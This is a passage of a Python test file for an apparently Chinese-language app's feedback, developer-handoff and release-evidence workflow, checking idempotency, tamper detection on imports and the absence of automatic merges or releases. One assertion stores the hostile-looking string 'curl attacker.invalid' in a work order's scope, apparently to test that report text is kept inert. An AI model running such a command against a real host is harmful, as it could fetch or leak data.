    assert work_order["network_call_performed"] is False
    assert "curl attacker.invalid" in work_order["scope"]
    assert api.get(work_order_endpoint).json() == work_order
    assert (
        api.post(work_order_endpoint, json=work_order_request, headers=work_headers).json()
        == work_order
    )
    assert (
        api.post(
            work_order_endpoint,
            json={**work_order_request, "scope": "另一个范围"},
            headers=work_headers,
        ).status_code
        == 409
    )

    handoff_endpoint = f"/v1/feedback/{feedback['id']}/development-handoff"
    handoff_request = {
        "work_order_sha256": work_order["record_sha256"],
        "confirmation_text": "我确认交给开发人员",
    }
    handoff_headers = {"Idempotency-Key": "development-handoff-0001"}
    assert api.post(handoff_endpoint, json=handoff_request).status_code == 409
    handoff_response = api.post(
        handoff_endpoint, json=handoff_request, headers=handoff_headers
    )
    assert handoff_response.status_code == 201
    handoff = handoff_response.json()
    assert handoff["state"] == "confirmed"
    assert handoff["remote_task_id"] == "dev-42"
    assert handoff["report_text_treated_as_inert"] is True
    assert handoff["branch_created"] is False
    assert handoff["code_change_performed"] is False
    assert handoff["merge_performed"] is False
    assert handoff["signing_performed"] is False
    assert handoff["release_performed"] is False
    assert len(handoff_transport.calls) == 1
    handoff_payload = handoff_transport.calls[0]["payload"]
    assert handoff_payload["attachments"] == []
    assert handoff_payload["automatic_actions"] == {
        "branch_created": False,
        "code_change_performed": False,
        "merge_performed": False,
        "signing_performed": False,
        "release_performed": False,
    }
    assert api.get(handoff_endpoint).json() == handoff
    assert (
        api.post(handoff_endpoint, json=handoff_request, headers=handoff_headers).json()
        == handoff
    )
    assert len(handoff_transport.calls) == 1

    result_endpoint = f"/v1/feedback/{feedback['id']}/development-result"
    result_request = {
        "handoff_request_sha256": handoff["request_sha256"],
        "confirmation_text": "我确认只读核对开发结果",
        "verified_by": "maintainer",
        "verified_at": "2026-09-01T07:30:00Z",
    }
    result_headers = {"Idempotency-Key": "development-result-0001"}
    assert api.post(result_endpoint, json=result_request).status_code == 409
    assert (
        api.post(
            result_endpoint,
            json={**result_request, "confirmation_text": "大概核对过了"},
            headers=result_headers,
        ).status_code
        == 409
    )
    assert result_verifier.calls == []
    created_result = api.post(
        result_endpoint, json=result_request, headers=result_headers
    )
    assert created_result.status_code == 201
    development_result = created_result.json()
    assert development_result["repository_url"] == "https://github.com/example/nalu"
    assert development_result["branch_name"] == "fix/upload-button"
    assert development_result["commit_sha"] == "a" * 40
    assert development_result["review_url"].endswith("/pull/42")
    assert development_result["read_only_verification_performed"] is True
    assert development_result["report_text_treated_as_inert"] is True
    assert development_result["repository_checkout_performed"] is False
    assert development_result["tool_calls"] == []
    assert development_result["code_executed"] is False
    assert development_result["merge_performed"] is False
    assert development_result["signing_performed"] is False
    assert development_result["release_performed"] is False
    assert development_result["external_write_performed"] is False
    assert len(result_verifier.calls) == 1
    assert api.get(result_endpoint).json() == development_result
    assert (
        api.post(result_endpoint, json=result_request, headers=result_headers).json()
        == development_result
    )
    assert len(result_verifier.calls) == 1
    assert (
        api.post(
            result_endpoint,
            json={**result_request, "verified_by": "another-maintainer"},
            headers=result_headers,
        ).status_code
        == 409
    )
    assert (
        api.post(
            result_endpoint,
            json=result_request,
            headers={"Idempotency-Key": "development-result-0002"},
        ).status_code
        == 409
    )

    release_endpoint = f"/v1/feedback/{feedback['id']}/release-linkage"
    release_request = {
        "review_bundle_sha256": bundle["bundle_sha256"],
        "reviewed_change": {
            "repository_url": development_result["repository_url"],
            "commit_sha": development_result["commit_sha"],
            "review_url": development_result["review_url"],
            "approved_by": "maintainer-a",
            "approved_at": "2026-09-01T08:00:00Z",
            "test_evidence_sha256": development_result["test_evidence_sha256"],
        },
        "ci": {
            "run_url": "https://github.com/example/nalu/actions/runs/42",
            "head_sha": development_result["commit_sha"],
            "conclusion": "success",
            "artifact_sha256": "c" * 64,
            "completed_at": "2026-09-01T08:10:00Z",
        },
        "installed_release": {
            "version": "0.2.0",
            "build": 20,
            "product_commit": development_result["commit_sha"],
            "artifact_sha256": "c" * 64,
            "provenance_sha256": "d" * 64,
            "developer_id_team_id": "AB12CD34EF",
            "notarization_submission_id": "12345678-1234-1234-1234-123456789abc",
            "code_signature_verified": True,
            "notarization_verified": True,
            "gatekeeper_accepted": True,
            "installed_at": "2026-09-01T08:20:00Z",
        },
        "rollback": {
            "previous_version": "0.1.0",
            "previous_build": 10,
            "evidence_sha256": "e" * 64,
            "project_data_preserved": True,
            "verified_at": "2026-09-01T08:30:00Z",
        },
    }
    unrelated_release = deepcopy(release_request)
    unrelated_release["reviewed_change"]["review_url"] = (
        "https://github.com/example/nalu/pull/43"
    )
    release_headers = {"Idempotency-Key": "release-linkage-result-0001"}
    assert (
        api.post(
            release_endpoint, json=unrelated_release, headers=release_headers
        ).status_code
        == 409
    )
    created_release = api.post(
        release_endpoint, json=release_request, headers=release_headers
    )
    assert created_release.status_code == 201
    release_linkage = created_release.json()
    assert (
        release_linkage["development_result_sha256"]
        == development_result["record_sha256"]
    )
    assert release_linkage["release_claimed"] is False
    assert api.get(release_endpoint).json() == release_linkage

    release_reconciliation_endpoint = (
        f"/v1/feedback/{feedback['id']}/release-evidence/reconciliation"
    )
    release_reconciliation_request = {
        "release_linkage_sha256": release_linkage["linkage_sha256"],
        "confirmation_text": "我确认只读核验这份发布证据",
    }
    release_reconciliation_headers = {
        "Idempotency-Key": "release-evidence-reconciliation-0001"
    }
    assert (
        api.post(
            release_reconciliation_endpoint,
            json=release_reconciliation_request,
        ).status_code
        == 409
    )
    release_evidence_verifier.artifact_sha256 = "f" * 64
    assert (
        api.post(
            release_reconciliation_endpoint,
            json=release_reconciliation_request,
            headers=release_reconciliation_headers,
        ).status_code
        == 409
    )
    assert len(release_evidence_verifier.calls) == 1
    release_evidence_verifier.artifact_sha256 = "c" * 64
    reconciled_response = api.post(
        release_reconciliation_endpoint,
        json=release_reconciliation_request,
        headers=release_reconciliation_headers,
    )
    assert reconciled_response.status_code == 201
    release_reconciliation = reconciled_response.json()
    assert release_reconciliation["status"] == "independently_verified"
    assert release_reconciliation["release_claimed"] is False
    assert release_reconciliation["read_only_verification_performed"] is True
    assert release_reconciliation["download_performed"] is False
    assert release_reconciliation["installation_performed"] is False
    assert release_reconciliation["signing_performed"] is False
    assert release_reconciliation["notarization_performed"] is False
    assert release_reconciliation["release_performed"] is False
    assert release_reconciliation["external_write_performed"] is False
    assert len(release_evidence_verifier.calls) == 2

    readiness_endpoint = f"/v1/feedback/{feedback['id']}/release-readiness"
    readiness = api.get(readiness_endpoint).json()
    assert readiness["ready_for_authorized_rollout"] is True
    assert readiness["released"] is False
    assert readiness["release_claimed"] is False
    assert readiness["network_call_performed"] is False
    assert readiness["external_write_performed"] is False
    readiness_by_id = {check["id"]: check for check in readiness["checks"]}
    assert readiness_by_id["independent_release_reconciliation"]["status"] == "satisfied"
    assert readiness_by_id["signed_notarized_installation"]["status"] == "satisfied"
    assert readiness_by_id["rollback_rehearsal"]["status"] == "satisfied"
    assert readiness_by_id["staged_rollout_authorization"]["status"] == "missing"
    assert readiness_by_id["staged_rollout_receipt"]["status"] == "missing"
    assert readiness_by_id["post_install_health"]["status"] == "missing"
    assert api.get(release_reconciliation_endpoint).json() == release_reconciliation
    assert (
        api.post(
            release_reconciliation_endpoint,
            json=release_reconciliation_request,
            headers=release_reconciliation_headers,
        ).json()
        == release_reconciliation
    )
    assert len(release_evidence_verifier.calls) == 2

    backup = api.get(f"/v1/projects/{project['id']}/export").json()
    assert backup["schema_version"] == "nalu.project-export/v19"
    restored = client(tmp_path / "export-restored")
    assert restored.post("/v1/project-imports", json=backup).status_code == 201
    assert restored.get(endpoint).json() == receipt
    assert restored.get(work_order_endpoint).json() == work_order
    assert restored.get(handoff_endpoint).json() == handoff
    assert restored.get(result_endpoint).json() == development_result
    assert restored.get(release_endpoint).json() == release_linkage
    assert (
        restored.get(release_reconciliation_endpoint).json()
        == release_reconciliation
    )
    assert restored.get(readiness_endpoint).json() == readiness

    tampered_release_reconciliation = deepcopy(backup)
    reconciliation_row = tampered_release_reconciliation["payload"][
        "feedback_release_evidence_reconciliations"
    ][0]
    reconciliation_body = json.loads(reconciliation_row["record_json"])
    reconciliation_body["external_write_performed"] = True
    reconciliation_row["record_json"] = json.dumps(
        reconciliation_body, ensure_ascii=False, sort_keys=True
    )
    reconciliation_row["record_sha256"] = hashlib.sha256(
        reconciliation_row["record_json"].encode()
    ).hexdigest()
    tampered_release_reconciliation["payload_sha256"] = hashlib.sha256(
        json.dumps(
            tampered_release_reconciliation["payload"],
            ensure_ascii=False,
            sort_keys=True,
        ).encode()
    ).hexdigest()
    assert (
        client(tmp_path / "release-reconciliation-tampered")
        .post("/v1/project-imports", json=tampered_release_reconciliation)
        .status_code
        == 409
    )

    mismatched_release_backup = deepcopy(backup)
    mismatched_release_row = mismatched_release_backup["payload"][
        "feedback_release_linkages"
    ][0]
    mismatched_release_body = json.loads(mismatched_release_row["linkage_json"])
    mismatched_release_body["reviewed_change"]["review_url"] = (
        "https://github.com/example/nalu/pull/43"
    )
    release_evidence = {
        key: mismatched_release_body[key]
        for key in (
            "review_bundle_sha256",
            "reviewed_change",
            "ci",
            "installed_release",
            "rollback",
        )
    }
    mismatched_release_request = {
        "feedback_id": feedback["id"],
        "idempotency_key_sha256": mismatched_release_body[
            "idempotency_key_sha256"
        ],
        "development_result_sha256": mismatched_release_body[
            "development_result_sha256"
        ],
        "evidence": release_evidence,
    }
    mismatched_release_body["request_sha256"] = hashlib.sha256(
        json.dumps(
            mismatched_release_request, ensure_ascii=False, sort_keys=True
        ).encode()
    ).hexdigest()
    mismatched_release_row["request_sha256"] = mismatched_release_body[
        "request_sha256"
    ]
    mismatched_release_row["linkage_json"] = json.dumps(
        mismatched_release_body, ensure_ascii=False, sort_keys=True
    )
    mismatched_release_row["linkage_sha256"] = hashlib.sha256(
        mismatched_release_row["linkage_json"].encode()
    ).hexdigest()
    mismatched_release_backup["payload_sha256"] = hashlib.sha256(
        json.dumps(
            mismatched_release_backup["payload"],
            ensure_ascii=False,
            sort_keys=True,
        ).encode()
    ).hexdigest()
    assert (
        client(tmp_path / "mismatched-release-result-backup")
        .post("/v1/project-imports", json=mismatched_release_backup)
        .status_code
        == 409
    )

    legacy_v12 = deepcopy(backup)
    legacy_v12["schema_version"] = "nalu.project-export/v12"
    legacy_v12["payload"].pop("feedback_external_reconciliations")
    legacy_v12["payload"].pop("feedback_development_work_orders")
    legacy_v12["payload"].pop("feedback_development_handoffs")
    legacy_v12["payload"].pop("feedback_development_handoff_reconciliations")
    legacy_v12["payload"].pop("feedback_development_results")
    legacy_v12["payload"].pop("feedback_release_evidence_reconciliations")
    legacy_v12["payload_sha256"] = hashlib.sha256(
        json.dumps(legacy_v12["payload"], ensure_ascii=False, sort_keys=True).encode()
    ).hexdigest()
    legacy_restored = client(tmp_path / "export-v12-restored")
    assert legacy_restored.post("/v1/project-imports", json=legacy_v12).status_code == 201
    assert legacy_restored.get(endpoint).json() == receipt

    tampered = deepcopy(backup)
    row = tampered["payload"]["feedback_external_exports"][0]
    body = json.loads(row["payload_json"])
    body["attachments"] = ["secret-photo.jpg"]
    row["payload_json"] = json.dumps(body, ensure_ascii=False, sort_keys=True)
    row["payload_sha256"] = hashlib.sha256(row["payload_json"].encode()).hexdigest()
    tampered["payload_sha256"] = hashlib.sha256(
        json.dumps(tampered["payload"], ensure_ascii=False, sort_keys=True).encode()
    ).hexdigest()
    assert (
        client(tmp_path / "export-tampered")
        .post("/v1/project-imports", json=tampered)
        .status_code
        == 409
    )

    tampered_work_order = deepcopy(backup)
    work_order_row = tampered_work_order["payload"][
        "feedback_development_work_orders"
    ][0]
    work_order_body = json.loads(work_order_row["record_json"])
    work_order_body["code_change_performed"] = True
    work_order_row["record_json"] = json.dumps(
        work_order_body, ensure_ascii=False, sort_keys=True
    )
    work_order_row["record_sha256"] = hashlib.sha256(
        work_order_row["record_json"].encode()
    ).hexdigest()
    tampered_work_order["payload_sha256"] = hashlib.sha256(
        json.dumps(
            tampered_work_order["payload"], ensure_ascii=False, sort_keys=True
        ).encode()
    ).hexdigest()
    assert (
        client(tmp_path / "work-order-tampered")
        .post("/v1/project-imports", json=tampered_work_order)
        .status_code
        == 409
    )

    tampered_handoff = deepcopy(backup)
    handoff_row = tampered_handoff["payload"]["feedback_development_handoffs"][0]
    handoff_body = json.loads(handoff_row["payload_json"])
    handoff_body["automatic_actions"]["code_change_performed"] = True
    handoff_row["payload_json"] = json.dumps(
        handoff_body, ensure_ascii=False, sort_keys=True
    )
    handoff_row["payload_sha256"] = hashlib.sha256(
        handoff_row["payload_json"].encode()
    ).hexdigest()
    tampered_handoff["payload_sha256"] = hashlib.sha256(
        json.dumps(tampered_handoff["payload"], ensure_ascii=False, sort_keys=True).encode()
    ).hexdigest()
    assert (
        client(tmp_path / "handoff-tampered")
        .post("/v1/project-imports", json=tampered_handoff)
        .status_code
        == 409
    )

    tampered_result = deepcopy(backup)
    result_row = tampered_result["payload"]["feedback_development_results"][0]
    result_body = json.loads(result_row["record_json"])
    result_body["merge_performed"] = True
    result_row["record_json"] = json.dumps(
        result_body, ensure_ascii=False, sort_keys=True
    )
    result_row["record_sha256"] = hashlib.sha256(
        result_row["record_json"].encode()
    ).hexdigest()
    tampered_result["payload_sha256"] = hashlib.sha256(
        json.dumps(
            tampered_result["payload"], ensure_ascii=False, sort_keys=True
        ).encode()
    ).hexdigest()
    assert (
        client(tmp_path / "development-result-tampered")
        .post("/v1/project-imports", json=tampered_result)
        .status_code
        == 409
    )

    project3, feedback3, triage3 = reviewed_feedback("开发交接歧义")
    bundle3 = api.get(f"/v1/feedback/{feedback3['id']}/review-bundle").json()
    export3 = api.post(
        f"/v1/feedback/{feedback3['id']}/external-export",
        json={
            "review_bundle_sha256": bundle3["bundle_sha256"],
            "triage_record_sha256": triage3["record_sha256"],
            "confirmation_text": "我确认导出问题单",
        },
        headers={"Idempotency-Key": "external-export-handoff-ambiguous"},
    ).json()
    work_order3 = api.post(
        f"/v1/feedback/{feedback3['id']}/development-work-order",
        json={
            **work_order_request,
            "triage_record_sha256": triage3["record_sha256"],
            "export_request_sha256": export3["request_sha256"],
        },
        headers={"Idempotency-Key": "development-work-order-ambiguous"},
    ).json()
    handoff_transport.fail = True
    handoff3_endpoint = f"/v1/feedback/{feedback3['id']}/development-handoff"
    handoff3_request = {
        "work_order_sha256": work_order3["record_sha256"],
        "confirmation_text": "我确认交给开发人员",
    }
    handoff3_headers = {"Idempotency-Key": "development-handoff-ambiguous"}
    assert (
        api.post(
            handoff3_endpoint, json=handoff3_request, headers=handoff3_headers
        ).status_code
        == 409
    )
    calls_after_ambiguous = len(handoff_transport.calls)
    assert (
        api.post(
            handoff3_endpoint, json=handoff3_request, headers=handoff3_headers
        ).status_code
        == 409
    )
    assert len(handoff_transport.calls) == calls_after_ambiguous
    with app.state.repository.db.connect() as connection:
        ambiguous_handoff = dict(
            connection.execute(
                "SELECT * FROM feedback_development_handoffs WHERE feedback_id = ?",
                (feedback3["id"],),
            ).fetchone()
        )
    assert ambiguous_handoff["state"] == "ambiguous"
    assert ambiguous_handoff["response_json"] is None
    assert ambiguous_handoff["remote_task_id"] is None
    handoff_transport.fail = False

    handoff_reconciliation_endpoint = f"{handoff3_endpoint}/reconciliation"
    handoff_reconciliation_request = {
        "payload_sha256": ambiguous_handoff["payload_sha256"],
        "confirmation_text": "我确认核对开发交接结果",
        "reconciled_by": "maintainer",
        "reconciled_at": "2026-09-01T07:20:00Z",
    }
    assert (
        api.post(
            handoff_reconciliation_endpoint,
            json={**handoff_reconciliation_request, "payload_sha256": "0" * 64},
            headers=handoff3_headers,
        ).status_code
        == 409
    )
    assert handoff_verifier.calls == []
    reconciled_handoff = api.post(
        handoff_reconciliation_endpoint,
        json=handoff_reconciliation_request,
        headers=handoff3_headers,
    )
    assert reconciled_handoff.status_code == 201
    handoff_reconciliation = reconciled_handoff.json()
    assert handoff_reconciliation["outcome"] == "confirmed"
    assert handoff_reconciliation["remote_task_id"] == "dev-84"
    assert handoff_reconciliation["work_order_submission_retried"] is False
    assert handoff_reconciliation["external_write_performed"] is False
    assert len(handoff_verifier.calls) == 1
    assert len(handoff_transport.calls) == calls_after_ambiguous
    assert api.get(handoff3_endpoint).json()["remote_task_id"] == "dev-84"
    assert (
        api.get(handoff_reconciliation_endpoint).json() == handoff_reconciliation
    )
    assert (
        api.post(
            handoff_reconciliation_endpoint,
            json=handoff_reconciliation_request,
            headers=handoff3_headers,
        ).json()
        == handoff_reconciliation
    )
    assert len(handoff_verifier.calls) == 1

    handoff_reconciliation_backup = api.get(
        f"/v1/projects/{project3['id']}/export"
    ).json()
    restored_handoff_reconciliation = client(tmp_path / "handoff-reconciled-restored")
    assert (
        restored_handoff_reconciliation.post(
            "/v1/project-imports", json=handoff_reconciliation_backup
        ).status_code
        == 201
    )
    assert (
        restored_handoff_reconciliation.get(handoff_reconciliation_endpoint).json()
        == handoff_reconciliation
    )
    tampered_handoff_reconciliation = deepcopy(handoff_reconciliation_backup)
    reconciliation_row = tampered_handoff_reconciliation["payload"][
        "feedback_development_handoff_reconciliations"
    ][0]
    reconciliation_body = json.loads(reconciliation_row["record_json"])
    reconciliation_body["remote_task_id"] = "dev-tampered"
    reconciliation_row["record_json"] = json.dumps(
        reconciliation_body, ensure_ascii=False, sort_keys=True
    )
    reconciliation_row["record_sha256"] = hashlib.sha256(
        reconciliation_row["record_json"].encode()
    ).hexdigest()
    tampered_handoff_reconciliation["payload_sha256"] = hashlib.sha256(
        json.dumps(
            tampered_handoff_reconciliation["payload"],
            ensure_ascii=False,
            sort_keys=True,
        ).encode()
    ).hexdigest()
    assert (
        client(tmp_path / "handoff-reconciliation-tampered")
        .post("/v1/project-imports", json=tampered_handoff_reconciliation)
        .status_code
        == 409
    )

    _, feedback4, triage4 = reviewed_feedback("开发交接确认不存在")
    bundle4 = api.get(f"/v1/feedback/{feedback4['id']}/review-bundle").json()
    export4 = api.post(
        f"/v1/feedback/{feedback4['id']}/external-export",
        json={
            "review_bundle_sha256": bundle4["bundle_sha256"],
            "triage_record_sha256": triage4["record_sha256"],
            "confirmation_text": "我确认导出问题单",
        },
        headers={"Idempotency-Key": "external-export-handoff-absent"},
    ).json()
    work_order4 = api.post(
        f"/v1/feedback/{feedback4['id']}/development-work-order",
        json={
            **work_order_request,
            "triage_record_sha256": triage4["record_sha256"],
            "export_request_sha256": export4["request_sha256"],
        },
        headers={"Idempotency-Key": "development-work-order-absent"},
    ).json()
    handoff_transport.fail = True
    handoff4_endpoint = f"/v1/feedback/{feedback4['id']}/development-handoff"
    handoff4_headers = {"Idempotency-Key": "development-handoff-absent"}
    assert (
        api.post(
            handoff4_endpoint,
            json={
                "work_order_sha256": work_order4["record_sha256"],
                "confirmation_text": "我确认交给开发人员",
            },
            headers=handoff4_headers,
        ).status_code
        == 409
    )
    with app.state.repository.db.connect() as connection:
        handoff4_payload_sha256 = connection.execute(
            "SELECT payload_sha256 FROM feedback_development_handoffs WHERE feedback_id = ?",
            (feedback4["id"],),
        ).fetchone()[0]
    handoff_verifier.outcome = "absent"
    absent_handoff_reconciliation = api.post(
        f"{handoff4_endpoint}/reconciliation",
        json={
            "payload_sha256": handoff4_payload_sha256,
            "confirmation_text": "我确认核对开发交接结果",
            "reconciled_by": "maintainer",
            "reconciled_at": "2026-09-01T07:30:00Z",
        },
        headers=handoff4_headers,
    )
    assert absent_handoff_reconciliation.status_code == 201
    assert absent_handoff_reconciliation.json()["outcome"] == "verified_absent"
    assert api.get(handoff4_endpoint).status_code == 409
    with app.state.repository.db.connect() as connection:
        assert connection.execute(
            "SELECT state FROM feedback_development_handoffs WHERE feedback_id = ?",
            (feedback4["id"],),
        ).fetchone()[0] == "rejected"
    handoff_transport.fail = False
    handoff_verifier.outcome = "found"

    ambiguous_transport = RecordingTransport(fail=True)

    class RecordingVerifier:
        def __init__(self) -> None:
            self.calls: list[dict] = []

        def lookup_issue(self, **kwargs) -> IssueTrackerLookup:
            self.calls.append(kwargs)
            return IssueTrackerLookup(
                outcome="found",
                receipt=IssueTrackerReceipt(
                    remote_issue_id="84",
                    remote_issue_url="https://github.com/example/nalu/issues/84",
                    response={"number": 84, "state": "open"},
                ),
                evidence={"source": "injected_read_only_fixture", "matched": True},
            )

    verifier = RecordingVerifier()
    ambiguous_app = create_app(
        tmp_path / "ambiguous.sqlite3",
        tmp_path / "ambiguous-data",
        feedback_export_policy=policy,
        issue_tracker_transport=ambiguous_transport,
        issue_tracker_reconciliation_verifier=verifier,
    )
    ambiguous_api = TestClient(ambiguous_app)
    project2 = ambiguous_api.post("/v1/projects", json={"title": "歧义结果"}).json()
    feedback2 = ambiguous_api.post(
        "/v1/feedback",
        json={
            "project_id": project2["id"],
            "category": "bug",
            "message": "歧义测试",
            "share_authorized": True,
        },
    ).json()
    bundle2 = ambiguous_api.post(
        f"/v1/feedback/{feedback2['id']}/review-bundle",
        json={
            "prepared_by": "本机用户",
            "expected_behavior": "成功",
            "actual_behavior": "失败",
            "reproduction_steps": ["操作"],
            "confirmation_text": "我确认生成审核包",
        },
    ).json()
    triage2 = ambiguous_api.post(
        f"/v1/feedback/{feedback2['id']}/triage",
        json={
            "review_bundle_sha256": bundle2["bundle_sha256"],
            "priority": "p2",
            "disposition": "accepted",
            "rationale": "测试",
            "reviewed_by": "maintainer",
            "reviewed_at": "2026-09-01T03:00:00Z",
            "confirmation_text": "我确认这份分诊",
        },
        headers={"Idempotency-Key": "ambiguous-triage-0001"},
    ).json()
    ambiguous_request = {
        "review_bundle_sha256": bundle2["bundle_sha256"],
        "triage_record_sha256": triage2["record_sha256"],
        "confirmation_text": "我确认导出问题单",
    }
    ambiguous_endpoint = f"/v1/feedback/{feedback2['id']}/external-export"
    ambiguous_headers = {"Idempotency-Key": "ambiguous-export-0001"}
    assert (
        ambiguous_api.post(
            ambiguous_endpoint, json=ambiguous_request, headers=ambiguous_headers
        ).status_code
        == 409
    )
    assert (
        ambiguous_api.post(
            ambiguous_endpoint, json=ambiguous_request, headers=ambiguous_headers
        ).status_code
        == 409
    )
    assert len(ambiguous_transport.calls) == 1

    reconciliation_endpoint = f"{ambiguous_endpoint}/reconciliation"
    with ambiguous_app.state.repository.db.connect() as connection:
        ambiguous_payload_sha256 = connection.execute(
            "SELECT payload_sha256 FROM feedback_external_exports WHERE feedback_id = ?",
            (feedback2["id"],),
        ).fetchone()[0]
    reconciliation_request = {
        "payload_sha256": ambiguous_payload_sha256,
        "confirmation_text": "我确认核对导出结果",
        "reconciled_by": "maintainer",
        "reconciled_at": "2026-09-01T06:30:00Z",
    }
    assert (
        ambiguous_api.post(
            reconciliation_endpoint, json=reconciliation_request
        ).status_code
        == 409
    )
    assert (
        ambiguous_api.post(
            reconciliation_endpoint,
            json={**reconciliation_request, "payload_sha256": "0" * 64},
            headers=ambiguous_headers,
        ).status_code
        == 409
    )
    assert (
        ambiguous_api.post(
            reconciliation_endpoint,
            json={**reconciliation_request, "confirmation_text": "大概核对过了"},
            headers=ambiguous_headers,
        ).status_code
        == 409
    )
    assert (
        ambiguous_api.post(
            reconciliation_endpoint,
            json=reconciliation_request,
            headers={"Idempotency-Key": "different-export-key"},
        ).status_code
        == 409
    )
    assert verifier.calls == []
    reconciled = ambiguous_api.post(
        reconciliation_endpoint,
        json=reconciliation_request,
        headers=ambiguous_headers,
    )
    assert reconciled.status_code == 201
    assert reconciled.json()["outcome"] == "confirmed"
    assert reconciled.json()["remote_issue_id"] == "84"
    assert reconciled.json()["read_only_verification_performed"] is True
    assert reconciled.json()["issue_creation_retried"] is False
    assert reconciled.json()["external_write_performed"] is False
    assert len(verifier.calls) == 1
    assert len(ambiguous_transport.calls) == 1
    assert ambiguous_api.get(ambiguous_endpoint).json()["remote_issue_id"] == "84"
    assert ambiguous_api.get(reconciliation_endpoint).json() == reconciled.json()
    replayed_reconciliation = ambiguous_api.post(
        reconciliation_endpoint,
        json=reconciliation_request,
        headers=ambiguous_headers,
    )
    assert replayed_reconciliation.json() == reconciled.json()
    assert len(verifier.calls) == 1
    assert (
        ambiguous_api.post(
            reconciliation_endpoint,
            json={**reconciliation_request, "reconciled_by": "another maintainer"},
            headers=ambiguous_headers,
        ).status_code
        == 409
    )

    reconciled_backup = ambiguous_api.get(
        f"/v1/projects/{project2['id']}/export"
    ).json()
    restored_reconciliation = client(tmp_path / "reconciled-restored")
    assert (
        restored_reconciliation.post(
            "/v1/project-imports", json=reconciled_backup
        ).status_code
        == 201
    )
    assert (
        restored_reconciliation.get(reconciliation_endpoint).json() == reconciled.json()
    )

    legacy_v13 = deepcopy(reconciled_backup)
    legacy_v13["schema_version"] = "nalu.project-export/v13"
    legacy_v13["payload"].pop("feedback_development_work_orders")
    legacy_v13["payload"].pop("feedback_development_handoffs")
    legacy_v13["payload"].pop("feedback_development_handoff_reconciliations")
    legacy_v13["payload"].pop("feedback_development_results")
    legacy_v13["payload"].pop("feedback_release_evidence_reconciliations")
    legacy_v13["payload_sha256"] = hashlib.sha256(
        json.dumps(legacy_v13["payload"], ensure_ascii=False, sort_keys=True).encode()
    ).hexdigest()
    legacy_v13_api = client(tmp_path / "reconciled-v13-restored")
    assert legacy_v13_api.post("/v1/project-imports", json=legacy_v13).status_code == 201
    assert legacy_v13_api.get(reconciliation_endpoint).json() == reconciled.json()

    tampered_reconciliation = deepcopy(reconciled_backup)
    reconciliation_row = tampered_reconciliation["payload"][
        "feedback_external_reconciliations"
    ][0]
    reconciliation_body = json.loads(reconciliation_row["record_json"])
    reconciliation_body["remote_issue_id"] = "999"
    reconciliation_row["record_json"] = json.dumps(
        reconciliation_body, ensure_ascii=False, sort_keys=True
    )
    reconciliation_row["record_sha256"] = hashlib.sha256(
        reconciliation_row["record_json"].encode()
    ).hexdigest()
    tampered_reconciliation["payload_sha256"] = hashlib.sha256(
        json.dumps(
            tampered_reconciliation["payload"], ensure_ascii=False, sort_keys=True
        ).encode()
    ).hexdigest()
    assert (
        client(tmp_path / "reconciliation-tampered")
        .post("/v1/project-imports", json=tampered_reconciliation)
        .status_code
        == 409
    )

    class AbsentVerifier:
        def __init__(self) -> None:
            self.calls: list[dict] = []

        def lookup_issue(self, **kwargs) -> IssueTrackerLookup:
            self.calls.append(kwargs)
            return IssueTrackerLookup(
                outcome="absent",
                receipt=None,
                evidence={"source": "injected_read_only_fixture", "matched": False},
            )

    absent_transport = RecordingTransport(fail=True)
    absent_verifier = AbsentVerifier()
    absent_app = create_app(
        tmp_path / "absent.sqlite3",
        tmp_path / "absent-data",
        feedback_export_policy=policy,
        issue_tracker_transport=absent_transport,
        issue_tracker_reconciliation_verifier=absent_verifier,
    )
    absent_api = TestClient(absent_app)
    _, absent_feedback, absent_triage = reviewed_feedback("确认不存在", absent_api)
    absent_bundle = absent_api.get(
        f"/v1/feedback/{absent_feedback['id']}/review-bundle"
    ).json()
    absent_endpoint = f"/v1/feedback/{absent_feedback['id']}/external-export"
    absent_export_request = {
        "review_bundle_sha256": absent_bundle["bundle_sha256"],
        "triage_record_sha256": absent_triage["record_sha256"],
        "confirmation_text": "我确认导出问题单",
    }
    absent_headers = {"Idempotency-Key": "absent-export-0001"}
    assert (
        absent_api.post(
            absent_endpoint, json=absent_export_request, headers=absent_headers
        ).status_code
        == 409
    )
    with absent_app.state.repository.db.connect() as connection:
        absent_payload_sha256 = connection.execute(
            "SELECT payload_sha256 FROM feedback_external_exports WHERE feedback_id = ?",
            (absent_feedback["id"],),
        ).fetchone()[0]
    absent_reconciliation_request = {
        "payload_sha256": absent_payload_sha256,
        "confirmation_text": "我确认核对导出结果",
        "reconciled_by": "maintainer",
        "reconciled_at": "2026-09-01T06:35:00Z",
    }
    absent_reconciliation_endpoint = f"{absent_endpoint}/reconciliation"
    absent_reconciled = absent_api.post(
        absent_reconciliation_endpoint,
        json=absent_reconciliation_request,
        headers=absent_headers,
    )
    assert absent_reconciled.status_code == 201
    assert absent_reconciled.json()["outcome"] == "verified_absent"
    assert absent_api.get(absent_endpoint).status_code == 409
    with absent_app.state.repository.db.connect() as connection:
        assert (
            connection.execute(
                "SELECT state FROM feedback_external_exports WHERE feedback_id = ?",
                (absent_feedback["id"],),
            ).fetchone()[0]
            == "rejected"
        )
    assert len(absent_transport.calls) == 1
    assert len(absent_verifier.calls) == 1
    assert (
        absent_api.post(
            absent_reconciliation_endpoint,
            json=absent_reconciliation_request,
            headers=absent_headers,
        ).json()
        == absent_reconciled.json()
    )
    assert len(absent_verifier.calls) == 1

    _, feedback3, triage3 = reviewed_feedback("并发导出")
    bundle3 = api.get(f"/v1/feedback/{feedback3['id']}/review-bundle").json()
    concurrent_endpoint = f"/v1/feedback/{feedback3['id']}/external-export"
    concurrent_request = {
        "review_bundle_sha256": bundle3["bundle_sha256"],
        "triage_record_sha256": triage3["record_sha256"],
        "confirmation_text": "我确认导出问题单",
    }
    before_calls = len(transport.calls)
    with ThreadPoolExecutor(max_workers=2) as executor:
        responses = list(
            executor.map(
                lambda _: api.post(
                    concurrent_endpoint,
                    json=concurrent_request,
                    headers={"Idempotency-Key": "concurrent-export-0001"},
                ),
                range(2),
            )
        )
    assert sorted(response.status_code for response in responses) in (
        [201, 201],
        [201, 409],
    )
    assert len(transport.calls) == before_calls + 1


def test_memory_card_requires_explicit_confirmation_and_keeps_evidence(tmp_path: Path) -> None:
    api = client(tmp_path)
    project = api.post(
        "/v1/projects",
        json={"title": "家庭记忆", "audience_mode": "older_adult"},
    ).json()
    asset = api.post(
        f"/v1/projects/{project['id']}/asset-imports",
        params={
            "filename": "notebook.jpg",
            "kind": "source_document",
            "name": "手写回忆第一页",
        },
        content=b"image bytes",
        headers={"Content-Type": "image/jpeg"},
    ).json()
    created = api.post(
        f"/v1/projects/{project['id']}/memory-cards",
        json={
